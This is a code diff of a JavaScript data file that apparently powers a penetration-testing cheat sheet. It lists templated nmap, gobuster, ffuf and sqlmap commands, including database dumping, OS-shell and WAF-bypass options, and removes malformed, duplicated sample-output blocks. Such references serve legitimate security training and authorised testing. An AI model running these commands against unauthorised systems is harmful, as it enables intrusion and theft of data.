@@ -4,265 +4,33 @@ const SECTIONS = [
     emoji: '\u{1F50D}',
     title: 'Reconnaissance',
     commands: [
-      { title: 'nmap — Basic scan', desc: 'Default scan on target IP', diff: 'easy', code: 'nmap <target>', output: 'Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.1\nHost is up (0.042s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 3.42s' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
-      { title: 'nmap — TCP SYN scan', desc: 'Stealth scan without completing TCP handshake', diff: 'easy', code: 'nmap -sS <target>', output: '# nmap -sS 10.10.10.1\nStarting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.1\nHost is up (0.035s latency).\nNot shown: 995 filtered ports\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n443/tcp  closed https\n3389/tcp closed ms-wbt-server\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 45.67s' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
-      { title: 'nmap — Specific port', desc: 'Scan a single port', diff: 'easy', code: 'nmap -p <port> <target>', output: '# nmap -p 80 10.10.10.1\nStarting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.1\nHost is up (0.038s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.87s' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
+      { title: 'nmap — Basic scan', desc: 'Default scan on target IP', diff: 'easy', code: 'nmap <target>' },
+      { title: 'nmap — TCP SYN scan', desc: 'Stealth scan without completing TCP handshake', diff: 'easy', code: 'nmap -sS <target>' },
+      { title: 'nmap — Specific port', desc: 'Scan a single port', diff: 'easy', code: 'nmap -p <port> <target>' },
       { title: 'nmap — Port range', desc: 'Scan a range of ports', diff: 'easy', code: 'nmap -p <start>-<end> <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
-      { title: 'nmap — All ports', desc: 'Full 65535 port TCP scan', diff: 'medium', code: 'nmap -p- -sC -sV -T4 <target>', output: '# nmap -p- -sC -sV -T4 10.10.10.1\nStarting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.1\nHost is up (0.041s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3\n80/tcp   open  http        Apache httpd 2.4.57\n|_http-title: Site.com\n| http-methods:\n|_  Potentially risky methods: PUT\n8080/tcp open  http-proxy  nginx 1.24.0\n\nNmap done: 1 IP address (1 host up) scanned in 265.34s' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
+      { title: 'nmap — All ports', desc: 'Full 65535 port TCP scan', diff: 'medium', code: 'nmap -p- -sC -sV -T4 <target>' },
       { title: 'nmap — UDP scan', desc: 'Scan common UDP ports', diff: 'medium', code: 'nmap -sU --top-ports 100 <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
-      { title: 'nmap — Service detection', desc: 'Identify service versions on open ports', diff: 'easy', code: 'nmap -sV <target>', output: '# nmap -sV 10.10.10.1\nStarting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.1\nHost is up (0.040s latency).\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3\n80/tcp open  http    Apache httpd 2.4.57\n\nService detection performed.\nNmap done: 1 IP address (1 host up) scanned in 6.85s' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
+      { title: 'nmap — Service detection', desc: 'Identify service versions on open ports', diff: 'easy', code: 'nmap -sV <target>' },
       { title: 'nmap — OS detection', desc: 'Determine target operating system', diff: 'medium', code: 'nmap -O <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Aggressive scan', desc: 'OS + version + scripts + traceroute', diff: 'medium', code: 'nmap -A <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Ping sweep', desc: 'Discover live hosts on subnet', diff: 'easy', code: 'nmap -sn <subnet>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Scan subnet', desc: 'Scan all devices in CIDR range', diff: 'easy', code: 'nmap <subnet>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Multiple hosts', desc: 'Scan several targets at once', diff: 'easy', code: 'nmap <target1> <target2>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Verbose output', desc: 'Detailed scan progress', diff: 'easy', code: 'nmap -v <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — NSE script', desc: 'Run a specific NSE script', diff: 'medium', code: 'nmap --script <script> <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Save TXT', desc: 'Save output to text file', diff: 'easy', code: 'nmap -oN <output> <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Save XML', desc: 'Save output to XML file', diff: 'easy', code: 'nmap -oX <output> <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — All formats', desc: 'Normal, XML, grepable at once', diff: 'easy', code: 'nmap -oA <output> <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Timing template', desc: 'Aggressive timing (fast scan)', diff: 'easy', code: 'nmap -T4 <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Firewall bypass', desc: 'Skip host discovery (assume host is up)', diff: 'medium', code: 'nmap -Pn <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Randomize hosts', desc: 'Scan hosts in random order to evade detection', diff: 'hard', code: 'nmap --randomize-hosts <subnet>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Exclude hosts', desc: 'Exclude specific IPs from scan', diff: 'easy', code: 'nmap --exclude <exclude_ip> <subnet>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Traceroute', desc: 'Show packet route to target', diff: 'medium', code: 'nmap --traceroute <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — OS fingerprint', desc: 'Combine OS + service version detection', diff: 'medium', code: 'nmap -O -sV <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — DNS enumeration', desc: 'List hosts without scanning them', diff: 'medium', code: 'nmap -sL <subnet>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'nmap — Version all', desc: 'Detect all possible services aggressively', diff: 'hard', code: 'nmap -sV --version-all <target>' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'dnsrecon', desc: 'DNS enumeration', diff: null, code: 'dnsrecon -d <domain>' },
       { title: 'dig — TXT records', desc: 'Check SPF, DKIM, DMARC', diff: null, code: 'dig <domain> TXT' },
-  output: '
-;; ANSWER SECTION:
-example.com. 3600 IN A 93.184.216.34
-example.com. 3600 IN MX 10 mail.example.com.
-
-;; Query time: 45 msec
-;; SERVER: 8.8.8.8#53(8.8.8.8)'
       { title: 'tls-scan — Single target', desc: 'Extract TLS cert metadata from IP', diff: 'medium', code: 'tls-scan -a <target> -p 443' },
       { title: 'tls-scan — Save output', desc: 'Save certificate data to JSONL', diff: 'medium', code: 'tls-scan -a <target> -p 443 -o <output>' },
       { title: 'tls-scan — From file', desc: 'Scan IPs from a list file', diff: 'medium', code: 'tls-scan -i <input_file> -o <output>' },
@@ -278,247 +46,31 @@ example.com. 3600 IN MX 10 mail.example.com.
     title: 'Scanning & Enumeration',
     commands: [
       { title: 'gobuster — Directory bruteforce', desc: 'Common web directories', diff: null, code: 'gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt' },
-  output: '
-===============================================================
-Gobuster v3.6
-by OJ Reeves & Christian Mehlmauer
-===============================================================
-[+] Url: http://10.10.10.1
-[+] Method: GET
-===============================================================
-/admin     (Status: 301) [Size: 178]
-/login     (Status: 200) [Size: 2341]
-/uploads   (Status: 301) [Size: 178]
-==============================================================='
       { title: 'gobuster — Subdomains', desc: 'DNS subdomain enumeration', diff: null, code: 'gobuster dns -d <domain> -w <wordlist>' },
-  output: '
-===============================================================
-Gobuster v3.6
-by OJ Reeves & Christian Mehlmauer
-===============================================================
-[+] Url: http://10.10.10.1
-[+] Method: GET
-===============================================================
-/admin     (Status: 301) [Size: 178]
-/login     (Status: 200) [Size: 2341]
-/uploads   (Status: 301) [Size: 178]
-==============================================================='
       { title: 'ffuf — Directory fuzzing', desc: 'Basic dir brute with FUZZ keyword', diff: 'medium', code: 'ffuf -u <url>/FUZZ -w <wordlist>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Subdomain fuzzing', desc: 'Discover subdomains via FUZZ', diff: 'hard', code: 'ffuf -u http://FUZZ.<domain> -w <wordlist>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — VHost fuzzing', desc: 'Discover virtual hosts via Host header', diff: 'hard', code: 'ffuf -u <url> -H "Host: FUZZ.<domain>" -w <wordlist>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Extension fuzzing', desc: 'Find file extensions', diff: 'medium', code: 'ffuf -u <url>/indexFUZZ -w <ext_list>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — GET param fuzzing', desc: 'Fuzz GET parameter values', diff: 'medium', code: 'ffuf -u "<url>/page.php?id=FUZZ" -w <wordlist>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — POST data fuzzing', desc: 'Fuzz POST body parameters', diff: 'hard', code: 'ffuf -u <url> -X POST -d "user=admin&pass=FUZZ" -w <wordlist>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — JSON API fuzzing', desc: 'Fuzz JSON request body', diff: 'hard', code: 'ffuf -u <url> -X POST -H "Content-Type: application/json" -d \'{"id":"FUZZ"}\' -w <wordlist>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Header fuzzing', desc: 'Fuzz custom HTTP headers', diff: 'hard', code: 'ffuf -u <url> -H "X-Forwarded-For: FUZZ" -w <wordlist>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Cookie fuzzing', desc: 'Fuzz cookie values', diff: 'hard', code: 'ffuf -u <url> -b "SESSIONID=FUZZ" -w <wordlist>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Match status code', desc: 'Show only specific HTTP status', diff: 'medium', code: 'ffuf -u <url>/FUZZ -w <wordlist> -mc <code>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Filter status code', desc: 'Hide specific status codes', diff: 'medium', code: 'ffuf -u <url>/FUZZ -w <wordlist> -fc <code>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Match size', desc: 'Show responses of specific size', diff: 'hard', code: 'ffuf -u <url>/FUZZ -w <wordlist> -ms <bytes>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Filter size', desc: 'Hide responses by size', diff: 'hard', code: 'ffuf -u <url>/FUZZ -w <wordlist> -fs <bytes>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Regex match', desc: 'Match responses matching regex', diff: 'hard', code: 'ffuf -u <url>/FUZZ -w <wordlist> -mr "<regex>"' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Auto-calibration', desc: 'Automatically filter noise', diff: 'medium', code: 'ffuf -u <url>/FUZZ -w <wordlist> -ac' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Recursive', desc: 'Recursively fuzz discovered dirs', diff: 'hard', code: 'ffuf -u <url>/FUZZ -w <wordlist> -recursion -recursion-depth <depth>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Threads', desc: 'Set concurrent request count', diff: 'medium', code: 'ffuf -u <url>/FUZZ -w <wordlist> -t <threads>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Rate limit', desc: 'Limit requests per second', diff: 'hard', code: 'ffuf -u <url>/FUZZ -w <wordlist> -rate <rps>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Follow redirects', desc: 'Follow HTTP 3xx redirects', diff: 'medium', code: 'ffuf -u <url>/FUZZ -w <wordlist> -r' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Proxy through Burp', desc: 'Route traffic through proxy', diff: 'hard', code: 'ffuf -u <url>/FUZZ -w <wordlist> -x http://<ip>:<port>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Save JSON', desc: 'Output results to JSON file', diff: 'medium', code: 'ffuf -u <url>/FUZZ -w <wordlist> -o <output> -of json' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Silent mode', desc: 'Display results only', diff: 'medium', code: 'ffuf -u <url>/FUZZ -w <wordlist> -s' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Ignore TLS', desc: 'Skip SSL certificate validation', diff: 'medium', code: 'ffuf -u <url>/FUZZ -w <wordlist> -k' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
       { title: 'ffuf — Request timeout', desc: 'Set HTTP request timeout', diff: 'medium', code: 'ffuf -u <url>/FUZZ -w <wordlist> -timeout <seconds>' },
-  output: '
-[Status: 200, Size: 2341, Words: 312]
-    * FUZZ: admin
-[Status: 200, Size: 1845, Words: 198]
-    * FUZZ: login
-[Status: 403, Size: 0]
-    * FUZZ: config
-:: Progress: [4619/4619] :: Errors: 0 ::'
     ]
   },
   {
@@ -546,128 +98,24 @@ by OJ Reeves & Christian Mehlmauer
     title: 'Web Exploitation',
     commands: [
       { title: 'sqlmap — Basic test', desc: 'Auto-detect SQLi vulnerability', diff: 'medium', code: 'sqlmap -u "<url>?param=1" --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — List databases', desc: 'Enumerate available databases', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --dbs --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — List tables', desc: 'Get tables from specific DB', diff: 'hard', code: 'sqlmap -u "<url>?param=1" -D <db> --tables --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — List columns', desc: 'Get columns from specific table', diff: 'hard', code: 'sqlmap -u "<url>?param=1" -D <db> -T <table> --columns --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — Dump table', desc: 'Extract all data from table', diff: 'hard', code: 'sqlmap -u "<url>?param=1" -D <db> -T <table> --dump --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — Dump all DBs', desc: 'Extract everything from all DBs', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --dump-all --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — Blind SQLi', desc: 'Test for blind/time-based injection', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --technique=BLIND --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — Time-based', desc: 'Test time-based injection only', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --technique=TIME --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — POST data', desc: 'Test POST parameter injection', diff: 'hard', code: 'sqlmap -u "<url>" --data="<post_data>" --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — Custom header', desc: 'Add custom HTTP header', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --header="<header>" --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — Cookie auth', desc: 'Use authentication cookie', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --cookie="<cookie>" --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — Proxy', desc: 'Route through Burp Suite', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --proxy="http://<ip>:<port>" --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — SQL shell', desc: 'Interactive SQL command shell', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --sql-shell --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — OS shell', desc: 'Get command shell on DB server', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --os-shell --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — WAF bypass', desc: 'Attempt to bypass WAF detection', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --waf --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'sqlmap — Verbose', desc: 'Detailed output with debug level', diff: 'hard', code: 'sqlmap -u "<url>?param=1" --verbose=<level> --batch' },
-  output: '
-[14:32:10] [INFO] GET parameter id is injectable
-[14:32:11] [INFO] the DBMS is MySQL
-web application: PHP 8.1
-back-end DBMS: MySQL 8.0'
       { title: 'curl — Basic request', desc: 'View response headers and body', diff: null, code: 'curl -iv <url>' },
-  output: '
-HTTP/1.1 200 OK
-Server: Apache/2.4.57 (Ubuntu)
-Content-Type: text/html
-Content-Length: 12345
-
-<!DOCTYPE html>
-<html><head><title>Site</title></head><body>...</body></html>'
       { title: 'curl — POST with data', desc: 'Send form/data to endpoint', diff: null, code: 'curl -X POST -d "user=admin&pass=test" <url>' },
-  output: '
-HTTP/1.1 200 OK
-Server: Apache/2.4.57 (Ubuntu)
-Content-Type: text/html
-Content-Length: 12345
-
-<!DOCTYPE html>
-<html><head><title>Site</title></head><body>...</body></html>'
       { title: 'curl — Custom headers', desc: 'Add auth cookies, user-agent', diff: null, code: 'curl -H "Authorization: Bearer <token>" -H "User-Agent: Mozilla/5.0" <url>' },
-  output: '
-HTTP/1.1 200 OK
-Server: Apache/2.4.57 (Ubuntu)
-Content-Type: text/html
-Content-Length: 12345
-
-<!DOCTYPE html>
